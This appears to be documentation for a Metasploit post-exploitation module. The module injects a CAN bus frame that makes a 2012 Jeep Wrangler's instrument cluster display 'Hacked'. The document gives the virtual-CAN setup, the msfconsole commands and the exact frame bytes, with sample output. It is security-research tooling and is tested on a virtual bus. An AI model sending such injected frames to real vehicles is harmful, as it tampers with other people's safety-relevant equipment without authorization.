## Introduction
This module allows you to send and display the word "Hacked" on a 2012 Jeep Wrangler EVIC or the interactive display system in the middle of the instrument cluster as long as the ECO option has been disabled from being displayed.

This was originally discovered by Chad Gibbons and has written a PoC about it and recorded a video about it in Youtube as can be seen in the `info` of the msf module.

## Verification Steps

Fire up virtual CAN bus:

1. `sudo modprobe can`
2. `sudo modprobe vcan`
3. `sudo ip link add dev vcan0 type vcan`
4. `sudo ip link set up vcan0`

Launch msf:

5. Start `msfconsole`
6. `use auxiliary/server/local_hwbridge`
7. `set uripath testbus`
8. `run`
9. `use auxiliary/client/hwbridge/connect`
10. `set targeturi testbus`

## Options

```
Module options (post/hardware/automotive/jeep_wrangler_evicsend):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CANBUS                    no        CAN Bus to perform scan on, defaults to connected bus
   SESSION                   yes       The session to run this module on.
```

## Scenarios
You can test this module doing a candump wherein the CAN Frame is `295 [7] 48 61 63 6B 65 64 0A` which actually displays the message "Hacked" on the display message of an Instrument Cluster.

```
msf5 auxiliary(client/hwbridge/connect) > run
[*] Running module against 127.0.0.1

[*] Attempting to connect to 127.0.0.1...
[*] Hardware bridge interface session 1 opened (127.0.0.1 -> 127.0.0.1) at 2019-09-11 04:59:40 -0700
[+] HWBridge session established
[*] HW Specialty: {"automotive"=>true}  Capabilities: {"can"=>true, "custom_methods"=>true}
[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge
[!]          could have real world consequences.  Use this module in a controlled testing
[!]          environment and with equipment you are authorized to perform testing on.
[*] Auxiliary module execution completed
msf5 auxiliary(client/hwbridge/connect) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         hwbridge cmd/hardware  automotive   127.0.0.1 -> 127.0.0.1 (127.0.0.1)

msf5 auxiliary(client/hwbridge/connect) > sessions -i 1
[*] Starting interaction with 1...

hwbridge > run post/hardware/automotive/jeep_wrangler_evicsend canbus=vcan0

[*] Sending EVIC with some love...
[*] Check the message at the EVIC or the interactive display system in the middle of the instrument cluster
hwbridge >
```

You can use candump to verify the CAN frame being sent:

```
┌──(kali㉿kali)-[~]
└─$ candump vcan0
  vcan0  295   [7]  48 61 63 6B 65 64 0A 
```
